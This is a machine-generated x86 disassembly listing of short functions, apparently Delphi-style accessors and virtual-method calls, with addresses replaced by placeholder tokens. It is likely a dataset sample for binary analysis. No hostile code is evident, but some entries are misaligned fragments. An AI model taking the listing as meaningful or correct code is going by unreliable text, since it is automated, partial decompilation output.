call sub_473c40
sub_4839f4
cmp dl [ eax + 0x269 ]
je r-xdata
retn
mov [ eax + 0x269 ] dl
call sub_445ac0
sub_483b80
push ebx
mov ebx eax
mov eax ebx
call sub_416f88
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_483bec
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_483c08
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_483c24
push ebx
mov ebx eax
mov eax ebx
call sub_46d924
pop ebx
retn
sub_483c98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46da90
pop esi
pop ebx
retn
sub_483cac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4173e4
pop esi
pop ebx
retn
sub_48422c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x26c ]
push eax
mov ecx [ esi + 0x268 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
pop esi
pop ebx
retn
sub_48444e
jmp sub_403e54
sub_48448c
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_484498
mov eax [ r-xdata ]
retn
sub_4844a0
mov eax [ r-xdata ]
retn
sub_484542
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_48468e
jmp sub_403e54
sub_484695
pop ecx
pop ebp
retn
sub_484724
mov eax [ eax + 0x14 ]
call sub_4174c4
retn
sub_48486d
jmp sub_403e54
sub_484874
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4848a0
mov eax [ eax + 0x14 ]
call sub_4171e4
retn
sub_4848ac
mov eax [ eax + 0x14 ]
call sub_4171e4
retn
sub_4848b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_48491c
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_484924
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_483cac
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_48496c
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_483cac
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_4849c0
mov eax [ r-xdata ]
retn
sub_4849c8
mov eax [ r-xdata ]
retn
sub_4849d0
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_4849e4
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_4849f8
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_484a0c
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_484a20
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_484a3c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_484a58
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_484a74
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_484af8
jmp sub_403e54
sub_484aff
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_484bd4
jmp sub_403e54
sub_484bdb
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_484c87
jmp sub_403e54
sub_484c8e
pop ebp
retn
sub_484c90
sub [ rw-data ] 0x1
retn
sub_485128
cmp eax 0x2176
cmp edx 0x9
jbe r-xdata
cmp ecx 0x3d9
retn
nop
nop
sub_485181
jmp sub_403e54
sub_485188
pop ebp
retn
